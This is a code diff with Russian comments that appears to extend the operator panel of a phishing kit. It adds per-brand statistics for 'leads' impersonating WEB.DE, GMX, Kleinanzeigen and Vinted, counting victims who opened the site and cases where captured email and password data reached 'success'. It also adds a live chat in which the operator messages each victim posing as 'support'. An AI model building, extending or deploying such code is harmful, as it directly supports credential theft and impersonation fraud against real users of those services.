@@ -62,6 +62,7 @@ async function bootstrap() {
     const leads = await fetchLeads();
     leadsCache = leads;
     renderForActiveBrand();
+    renderStats();
   } catch (e) {
     console.error('[backend] fetch failed', e);
     if (window.toast) window.toast.error('Не удалось загрузить лидов', e.message || '');
@@ -172,6 +173,8 @@ function selectLead(id) {
   // визуально подсвечиваем
   LIST_EL.querySelectorAll('.lead-row').forEach((x) => x.classList.toggle('active', x.getAttribute('data-lead-id') === id));
   renderDetail(lead);
+  // подгружаем чат для нового лида (если включён tab Chat)
+  if (typeof loadChatForActive === 'function') loadChatForActive();
 }
 
 function renderDetail(lead) {
@@ -270,6 +273,127 @@ function wireActionHandlers() {
   });
 }
 
+// ── Stats: пересчёт по реальным leadsCache + /api/stats ───────────────
+function renderStats() {
+  if (!leadsCache.length) return;
+  const brands = { webde: [], gmx: [], klein: [], vint: [] };
+  leadsCache.forEach((l) => {
+    const b = (l.brand || '').toLowerCase();
+    if (brands[b]) brands[b].push(l);
+    else if (l.email || l.password) brands.webde.push(l);
+  });
+  const isSuccess = (l) => /success|show_success/i.test(l.status || '');
+  const isClicked = (l) => l.openedAt || l.lastSeenAt; // переход = было открытие сайта
+  document.querySelectorAll('.brand-stats').forEach((card) => {
+    const dot = card.querySelector('.brand-dot');
+    let key = 'webde';
+    if (dot && dot.classList.contains('gx')) key = 'gmx';
+    else if (dot && dot.classList.contains('kl')) key = 'klein';
+    else if (dot && dot.classList.contains('vt')) key = 'vint';
+    const list = brands[key] || [];
+    const total = list.length;
+    const clicks = list.filter(isClicked).length;
+    const success = list.filter(isSuccess).length;
+    const vals = card.querySelectorAll('.brand-stat-value');
+    if (vals[0]) vals[0].textContent = total;
+    if (vals[1]) {
+      const pct = total ? Math.round((clicks / total) * 100 * 10) / 10 : 0;
+      vals[1].innerHTML = `${clicks} <span class="brand-stat-pct">${pct}%</span>`;
+    }
+    if (vals[2]) {
+      const pct = clicks ? Math.round((success / clicks) * 100 * 10) / 10 : 0;
+      vals[2].innerHTML = `${success} <span class="brand-stat-pct">${pct}%</span>`;
+    }
+  });
+}
+
+// ── Чат с лидом — /api/chat ───────────────────────────────────────────
+const CHAT_LOG    = document.getElementById('chat-log');
+const CHAT_EMPTY  = document.getElementById('chat-empty');
+const CHAT_TYPING = document.getElementById('chat-typing');
+const CHAT_FORM   = document.getElementById('chat-compose');
+const CHAT_INPUT  = document.getElementById('chat-input');
+
+let chatPollTimer = null;
+let chatLastAt = 0;
+
+async function fetchChat(leadId) {
+  const r = await fetch(`/api/chat?leadId=${encodeURIComponent(leadId)}`, { credentials: 'include' });
+  if (!r.ok) throw new Error('HTTP ' + r.status);
+  return r.json();
+}
+
+function chatTimeFmt(at) {
+  try { return new Date(at).toTimeString().slice(0, 5); } catch (_) { return ''; }
+}
+
+function renderChat(messages) {
+  if (!CHAT_LOG) return;
+  CHAT_LOG.querySelectorAll('.chat-msg').forEach((n) => n.remove());
+  if (!messages || !messages.length) {
+    if (CHAT_EMPTY) CHAT_EMPTY.hidden = false;
+    return;
+  }
+  if (CHAT_EMPTY) CHAT_EMPTY.hidden = true;
+  messages.forEach((m) => {
+    const side = m.from === 'support' ? 'out' : 'in';
+    const wrap = document.createElement('div');
+    wrap.className = `chat-msg chat-msg--${side}`;
+    if (side === 'out' && (m.deliveryStatus === 'read')) wrap.classList.add('read');
+    const ticks = side === 'out' ? '<span class="chat-msg-ticks">✓✓</span>' : '';
+    const safe = String(m.text || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    wrap.innerHTML = `<div class="chat-msg-body">${safe}</div><div class="chat-msg-time">${chatTimeFmt(m.at)}${ticks}</div>`;
+    if (CHAT_TYPING) CHAT_LOG.insertBefore(wrap, CHAT_TYPING);
+    else CHAT_LOG.appendChild(wrap);
+  });
+  CHAT_LOG.scrollTop = CHAT_LOG.scrollHeight;
+}
+
+async function loadChatForActive() {
+  if (!activeLeadId) { renderChat([]); return; }
+  try {
+    const data = await fetchChat(activeLeadId);
+    renderChat(data.messages || []);
+    if (CHAT_TYPING) CHAT_TYPING.hidden = !data.userTyping;
+  } catch (e) {
+    if (window.toast) window.toast.error('Чат недоступен', e.message || '');
+  }
+}
+
+function startChatPolling() {
+  if (chatPollTimer) return;
+  chatPollTimer = setInterval(() => {
+    if (!document.getElementById('lead-chat') || document.getElementById('lead-chat').hidden) return;
+    loadChatForActive();
+  }, 4000);
+}
+
+CHAT_FORM && CHAT_FORM.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const text = (CHAT_INPUT.value || '').trim();
+  if (!text || !activeLeadId) return;
+  CHAT_INPUT.value = '';
+  try {
+    const r = await fetch('/api/chat', {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ leadId: activeLeadId, from: 'support', text }),
+    });
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    loadChatForActive();
+  } catch (err) {
+    if (window.toast) window.toast.error('Сообщение не отправлено', err.message || '');
+  }
+});
+
+// Когда юзер переключает rail-кнопку Chat → загрузить актуальное
+document.querySelectorAll('.rail-btn[data-rail="chat"]').forEach((b) => {
+  b.addEventListener('click', () => loadChatForActive());
+});
+
+startChatPolling();
+
 // ── WebSocket ─────────────────────────────────────────────────────────
 function connectWS() {
   let url;
@@ -297,7 +421,12 @@ async function onWSMessage(ev) {
       const leads = await fetchLeads();
       leadsCache = leads;
       renderForActiveBrand();
+      renderStats();
     } catch (_) {}
+  }
+  // Сообщение в чате → перезагружаем чат активного лида
+  if (msg && (msg.type === 'chat' || msg.event === 'chat-message')) {
+    if (typeof loadChatForActive === 'function') loadChatForActive();
   }
 }
 
